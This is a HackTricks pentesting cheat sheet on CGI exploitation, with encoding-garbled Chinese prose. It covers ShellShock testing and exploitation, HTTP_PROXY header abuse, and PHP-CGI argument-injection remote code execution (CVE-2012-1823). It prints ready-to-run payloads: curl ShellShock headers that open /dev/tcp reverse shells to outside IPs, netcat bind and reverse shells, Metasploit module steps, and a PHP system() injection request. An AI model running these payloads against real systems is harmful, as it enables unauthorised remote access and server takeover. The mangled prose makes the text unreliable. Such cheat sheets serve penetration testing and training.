{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


# ä¿¡æ¯

**CGI è„šæœ¬æ˜¯ perl è„šæœ¬**ï¼Œå› æ­¤ï¼Œå¦‚æœæ‚¨å·²æ”»é™·å¯ä»¥æ‰§è¡Œ _**.cgi**_ è„šæœ¬çš„æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥ **ä¸Šä¼ ä¸€ä¸ª perl åå‘ shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\)ï¼Œ**å°†æ‰©å±•å**ä» **.pl** æ›´æ”¹ä¸º **.cgi**ï¼Œç»™äºˆ **æ‰§è¡Œæƒé™** \(`chmod +x`\)ï¼Œå¹¶ **é€šè¿‡ç½‘é¡µæµè§ˆå™¨è®¿é—®** åå‘ shell ä»¥æ‰§è¡Œå®ƒã€‚  
ä¸ºäº†æµ‹è¯• **CGI æ¼æ´**ï¼Œå»ºè®®ä½¿ç”¨ `nikto -C all` \(ä»¥åŠæ‰€æœ‰æ’ä»¶\)

# **ShellShock**

**ShellShock** æ˜¯ä¸€ä¸ª **æ¼æ´**ï¼Œå½±å“å¹¿æ³›ä½¿ç”¨çš„ **Bash** å‘½ä»¤è¡Œ shell åœ¨åŸºäº Unix çš„æ“ä½œç³»ç»Ÿä¸­ã€‚å®ƒé’ˆå¯¹ Bash è¿è¡Œåº”ç”¨ç¨‹åºä¼ é€’çš„å‘½ä»¤çš„èƒ½åŠ›ã€‚è¯¥æ¼æ´å­˜åœ¨äº **ç¯å¢ƒå˜é‡** çš„æ“æ§ä¸­ï¼Œç¯å¢ƒå˜é‡æ˜¯å½±å“è®¡ç®—æœºä¸Šè¿›ç¨‹è¿è¡Œçš„åŠ¨æ€å‘½åå€¼ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å°† **æ¶æ„ä»£ç ** é™„åŠ åˆ°ç¯å¢ƒå˜é‡æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¯¥ä»£ç åœ¨æ¥æ”¶åˆ°å˜é‡æ—¶æ‰§è¡Œã€‚è¿™ä½¿å¾—æ”»å‡»è€…æœ‰å¯èƒ½æ”»é™·ç³»ç»Ÿã€‚

åˆ©ç”¨æ­¤æ¼æ´ï¼Œ**é¡µé¢å¯èƒ½ä¼šæŠ›å‡ºé”™è¯¯**ã€‚

æ‚¨å¯ä»¥é€šè¿‡æ³¨æ„åˆ°å®ƒä½¿ç”¨ **æ—§ç‰ˆ Apache** å’Œ **cgi\_mod** \(å¸¦æœ‰ cgi æ–‡ä»¶å¤¹\) æˆ–ä½¿ç”¨ **nikto** æ¥ **å‘ç°** æ­¤æ¼æ´ã€‚

## **æµ‹è¯•**

å¤§å¤šæ•°æµ‹è¯•åŸºäºå›æ˜¾æŸäº›å†…å®¹ï¼Œå¹¶æœŸæœ›è¯¥å­—ç¬¦ä¸²åœ¨ç½‘é¡µå“åº”ä¸­è¿”å›ã€‚å¦‚æœæ‚¨è®¤ä¸ºæŸä¸ªé¡µé¢å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œè¯·æœç´¢æ‰€æœ‰ cgi é¡µé¢å¹¶è¿›è¡Œæµ‹è¯•ã€‚

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(åå°„ã€ç›²æ³¨å’Œå¸¦å¤–\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## åˆ©ç”¨
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **ä»£ç† \(MitM åˆ° Web æœåŠ¡å™¨è¯·æ±‚\)**

CGI ä¸º http è¯·æ±‚ä¸­çš„æ¯ä¸ªå¤´åˆ›å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ä¾‹å¦‚ï¼šâ€œhost:web.comâ€ è¢«åˆ›å»ºä¸º â€œHTTP\_HOSTâ€="web.com"

ç”±äº HTTP\_PROXY å˜é‡å¯ä»¥è¢« web æœåŠ¡å™¨ä½¿ç”¨ã€‚å°è¯•å‘é€ä¸€ä¸ª **å¤´** åŒ…å«ï¼šâ€œ**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**â€ï¼Œå¦‚æœæœåŠ¡å™¨åœ¨ä¼šè¯æœŸé—´æ‰§è¡Œä»»ä½•è¯·æ±‚ã€‚æ‚¨å°†èƒ½å¤Ÿæ•è·æœåŠ¡å™¨å‘å‡ºçš„æ¯ä¸ªè¯·æ±‚ã€‚

# æ—§ PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

åŸºæœ¬ä¸Šï¼Œå¦‚æœ cgi æ˜¯æ´»åŠ¨çš„å¹¶ä¸” php æ˜¯â€œæ—§çš„â€ \(&lt;5.3.12 / &lt; 5.4.2\)ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»£ç ã€‚
ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ‚¨éœ€è¦è®¿é—® web æœåŠ¡å™¨çš„æŸä¸ª PHP æ–‡ä»¶è€Œä¸å‘é€å‚æ•° \(ç‰¹åˆ«æ˜¯æ²¡æœ‰å‘é€å­—ç¬¦â€œ=â€\)ã€‚
ç„¶åï¼Œä¸ºäº†æµ‹è¯•è¿™ä¸ªæ¼æ´ï¼Œæ‚¨å¯ä»¥è®¿é—®ä¾‹å¦‚ `/index.php?-s` \(æ³¨æ„ `-s`\)ï¼Œ**åº”ç”¨ç¨‹åºçš„æºä»£ç å°†å‡ºç°åœ¨å“åº”ä¸­**ã€‚

ç„¶åï¼Œä¸ºäº†è·å¾— **RCE**ï¼Œæ‚¨å¯ä»¥å‘é€è¿™ä¸ªç‰¹æ®ŠæŸ¥è¯¢ï¼š`/?-d allow_url_include=1 -d auto_prepend_file=php://input` å’Œ **è¦åœ¨è¯·æ±‚çš„ä¸»ä½“ä¸­æ‰§è¡Œçš„ PHP ä»£ç **ã€‚
ç¤ºä¾‹ï¼š**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**æœ‰å…³æ¼æ´å’Œå¯èƒ½çš„åˆ©ç”¨ä¿¡æ¯ï¼š** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF å†™ä½œç¤ºä¾‹**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
